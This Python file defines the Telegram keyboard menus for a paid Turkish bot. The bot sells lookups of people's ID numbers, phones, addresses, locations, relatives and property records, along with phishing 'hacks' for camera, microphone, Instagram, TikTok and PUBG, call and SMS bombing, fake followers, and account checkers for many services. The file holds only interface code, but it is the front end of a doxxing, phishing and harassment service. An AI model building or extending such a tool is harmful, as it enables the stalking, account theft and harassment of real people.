# keyboards.py
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from config import PLANS


def main_menu(is_admin=False):
    rows = [
        [InlineKeyboardButton("🔍 Premium Sorgu Paneli", callback_data="sorgu_paneli")],
        [InlineKeyboardButton("🌌 Uzay Modu", callback_data="uzay_modu"),
         InlineKeyboardButton("🎣 Phising", callback_data="menu_phish")],
        [InlineKeyboardButton("🤖 Bot Basma", callback_data="menu_bot"),
         InlineKeyboardButton("📞 Call/SMS Bomb", callback_data="menu_bomb")],
        [InlineKeyboardButton("🔎 Checker", callback_data="menu_checker"),
         InlineKeyboardButton("👑 Premium", callback_data="menu_premium")],
        [InlineKeyboardButton("👤 Profilim", callback_data="menu_profile"),
         InlineKeyboardButton("💬 Destek", callback_data="menu_support")],
    ]
    if is_admin:
        rows.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="menu_admin")])
    return InlineKeyboardMarkup(rows)


def back_main():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Ana Menü", callback_data="back_main")]])


def back_to(data, label="🔙 Geri"):
    return InlineKeyboardMarkup([[InlineKeyboardButton(label, callback_data=data)]])


def sorgu_paneli_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👤 Kişi", callback_data="cat_kisi"),
         InlineKeyboardButton("📱 GSM", callback_data="cat_gsm")],
        [InlineKeyboardButton("🏠 Adres", callback_data="cat_adres"),
         InlineKeyboardButton("🏛 Tapu", callback_data="cat_tapu")],
        [InlineKeyboardButton("🏢 İşyeri", callback_data="cat_isyeri"),
         InlineKeyboardButton("💳 Mali", callback_data="cat_mali")],
        [InlineKeyboardButton("⚖️ Hukuki", callback_data="cat_hukuki"),
         InlineKeyboardButton("📷 Vesika", callback_data="sorgu_vesika")],
        [InlineKeyboardButton("◀️ Geri", callback_data="back_main")],
    ])


def cat_kisi_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👤 Ad Soyad", callback_data="sorgu_adsoyad")],
        [InlineKeyboardButton("🪪 TC Sorgusu", callback_data="sorgu_tc")],
        [InlineKeyboardButton("👥 2 İsimli", callback_data="sorgu_ad2")],
        [InlineKeyboardButton("🔰 Sülale", callback_data="sorgu_sulale")],
        [InlineKeyboardButton("👨‍👩‍👧 Aile", callback_data="sorgu_aile")],
        [InlineKeyboardButton("🚀 Aile Pro", callback_data="sorgu_ailepro")],
        [InlineKeyboardButton("🔎 Aile Detay", callback_data="sorgu_ailedetay")],
        [InlineKeyboardButton("🌳 Soy Ağacı", callback_data="sorgu_soyagaci")],
        [InlineKeyboardButton("👧 Çocuk", callback_data="sorgu_cocuk")],
        [InlineKeyboardButton("⚡ TC Pro", callback_data="sorgu_tcpro")],
        [InlineKeyboardButton("◀️ Geri", callback_data="sorgu_paneli")],
    ])


def cat_gsm_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📞 GSM→TC", callback_data="sorgu_gsmtc")],
        [InlineKeyboardButton("🆔 TC→GSM", callback_data="sorgu_tcgsm")],
        [InlineKeyboardButton("⭐ GSM Pro", callback_data="sorgu_gsmpro")],
        [InlineKeyboardButton("🔄 GSM Güncel", callback_data="sorgu_gsmnew")],
        [InlineKeyboardButton("🔑 GSM Çözümle", callback_data="sorgu_gsmcoz")],
        [InlineKeyboardButton("📦 Multi GSM", callback_data="sorgu_gsmcoklu")],
        [InlineKeyboardButton("📋 Multi TC+GSM", callback_data="sorgu_coklutcgsm")],
        [InlineKeyboardButton("💎 TC-GSM-TC", callback_data="sorgu_tcgsmgsmtc")],
        [InlineKeyboardButton("🚀 V2 TC-GSM", callback_data="sorgu_tcgsmgsmtcv2")],
        [InlineKeyboardButton("◀️ Geri", callback_data="sorgu_paneli")],
    ])


def cat_adres_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🏠 Adres", callback_data="sorgu_adres")],
        [InlineKeyboardButton("📍 Konum", callback_data="sorgu_konum")],
        [InlineKeyboardButton("🔄 Adres Güncel", callback_data="sorgu_adresnew")],
        [InlineKeyboardButton("📊 Adres 2024", callback_data="sorgu_adresv")],
        [InlineKeyboardButton("◀️ Geri", callback_data="sorgu_paneli")],
    ])


def cat_tapu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📋 Tapu", callback_data="sorgu_tapu")],
        [InlineKeyboardButton("📦 Ada Parsel", callback_data="sorgu_parsel")],
        [InlineKeyboardButton("🗾 Parsel İl-İlçe", callback_data="sorgu_parselililce")],
        [InlineKeyboardButton("◀️ Geri", callback_data="sorgu_paneli")],
    ])


def cat_isyeri_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🏢 İşyeri Sahibi", callback_data="sorgu_isyeri")],
        [InlineKeyboardButton("👨‍💼 Çalışan", callback_data="sorgu_calisan")],
        [InlineKeyboardButton("💼 SGK", callback_data="sorgu_sgk")],
        [InlineKeyboardButton("◀️ Geri", callback_data="sorgu_paneli")],
    ])


def cat_mali_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 İBAN", callback_data="sorgu_iban")],
        [InlineKeyboardButton("🎓 Okul No", callback_data="sorgu_okul")],
        [InlineKeyboardButton("🚗 Plaka", callback_data="sorgu_plaka")],
        [InlineKeyboardButton("💳 Papara", callback_data="sorgu_papara")],
        [InlineKeyboardButton("◀️ Geri", callback_data="sorgu_paneli")],
    ])


def cat_hukuki_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚖️ Polis", callback_data="sorgu_polis")],
        [InlineKeyboardButton("🌐 Mülteci", callback_data="sorgu_multeci")],
        [InlineKeyboardButton("📡 TTNet", callback_data="sorgu_ttnet")],
        [InlineKeyboardButton("◀️ Geri", callback_data="sorgu_paneli")],
    ])


def uzay_modu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌌 Uzay Modunu Başlat", callback_data="uzay_baslat")],
        [InlineKeyboardButton("◀️ Geri", callback_data="back_main")],
    ])


def phish_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📱 Cihaz Bilgisi", callback_data="phish_device")],
        [InlineKeyboardButton("🎥 Kamera Hack", callback_data="phish_camera")],
        [InlineKeyboardButton("🎙️ Mikrofon Hack", callback_data="phish_microphone")],
        [InlineKeyboardButton("📞 Call Bomber", callback_data="phish_call")],
        [InlineKeyboardButton("📱 SMS Bomber", callback_data="phish_sms")],
        [InlineKeyboardButton("📸 Instagram Hack", callback_data="phish_instagram")],
        [InlineKeyboardButton("🎵 TikTok Hack", callback_data="phish_tiktok")],
        [InlineKeyboardButton("🎮 PUBG Hack", callback_data="phish_pubg")],
        [InlineKeyboardButton("◀️ Geri", callback_data="back_main")],
    ])


def bot_basma_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📸 Instagram Takipçi", callback_data="bot_instagram")],
        [InlineKeyboardButton("▶️ YouTube Abone", callback_data="bot_youtube")],
        [InlineKeyboardButton("🎵 TikTok Takipçi", callback_data="bot_tiktok")],
        [InlineKeyboardButton("◀️ Geri", callback_data="back_main")],
    ])


def bomb_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📞 Call Bomb", callback_data="bomb_call")],
        [InlineKeyboardButton("📱 SMS Bomb", callback_data="bomb_sms")],
        [InlineKeyboardButton("◀️ Geri", callback_data="back_main")],
    ])


def checker_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎬 CapCut", callback_data="chk_capcut"),
         InlineKeyboardButton("🛒 OyuncuStore", callback_data="chk_oyuncustore")],
        [InlineKeyboardButton("📺 Exxen", callback_data="chk_exxen"),
         InlineKeyboardButton("📡 Tabii", callback_data="chk_tabii")],
        [InlineKeyboardButton("🔍 Epinfy", callback_data="chk_epinfy"),
         InlineKeyboardButton("🎮 S2GEPIN", callback_data="chk_s2gepin")],
        [InlineKeyboardButton("📚 İdefix", callback_data="chk_idefix"),
         InlineKeyboardButton("⚽ SSport+", callback_data="chk_ssport")],
        [InlineKeyboardButton("📱 SMSOnay", callback_data="chk_smsonay"),
         InlineKeyboardButton("🎯 BEIN x TOD", callback_data="chk_beitod")],
        [InlineKeyboardButton("🏪 Medya Bayim", callback_data="chk_medyabayim"),
         InlineKeyboardButton("🌍 EZGlobal", callback_data="chk_ezglobal")],
        [InlineKeyboardButton("💎 OyunDinar", callback_data="chk_oyundinar"),
         InlineKeyboardButton("📧 Hotmail", callback_data="chk_hotmail")],
        [InlineKeyboardButton("📖 BKM Kitap", callback_data="chk_bkmkitap"),
         InlineKeyboardButton("👻 Snapchat", callback_data="chk_snapchat")],
        [InlineKeyboardButton("📰 Barlas", callback_data="chk_barlas"),
         InlineKeyboardButton("🕹 SuperCell", callback_data="chk_supercell")],
        [InlineKeyboardButton("🐉 Fenix", callback_data="chk_fenix")],
        [InlineKeyboardButton("◀️ Geri", callback_data="back_main")],
    ])


def premium_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Kod Kullan", callback_data="prem_redeem")],
        [InlineKeyboardButton("📩 Talep Et", callback_data="prem_request")],
        [InlineKeyboardButton("💳 Satın Al (Kart)", callback_data="prem_buy")],
        [InlineKeyboardButton("◀️ Geri", callback_data="back_main")],
    ])


def premium_plans_text():
    text = "👑 <b>PREMIUM PLANLAR</b>\n" + "━" * 25 + "\n\n"
    for p in PLANS.values():
        text += f"📦 {p['name']} — {p['price']} TL\n"
    text += "\n" + "━" * 25 + "\n👑 VIP = günlük limit kaldırma"
    return text


def support_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📩 Destek Talebi Aç", callback_data="support_open")],
        [InlineKeyboardButton("💬 Aktif Talebim", callback_data="support_my")],
        [InlineKeyboardButton("◀️ Geri", callback_data="back_main")],
    ])


def admin_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 İstatistik", callback_data="adm_stats"),
         InlineKeyboardButton("📋 Kullanıcılar", callback_data="adm_users")],
        [InlineKeyboardButton("🚫 Ban", callback_data="adm_ban"),
         InlineKeyboardButton("✅ Unban", callback_data="adm_unban")],
        [InlineKeyboardButton("👑 Premium Ver", callback_data="adm_prem"),
         InlineKeyboardButton("❌ Premium Al", callback_data="adm_unprem")],
        [InlineKeyboardButton("📢 Duyuru", callback_data="adm_announce"),
         InlineKeyboardButton("🔑 Kod Oluştur", callback_data="adm_gencode")],
        [InlineKeyboardButton("📜 Kodlar", callback_data="adm_codes"),
         InlineKeyboardButton("◀️ Geri", callback_data="back_main")],
    ])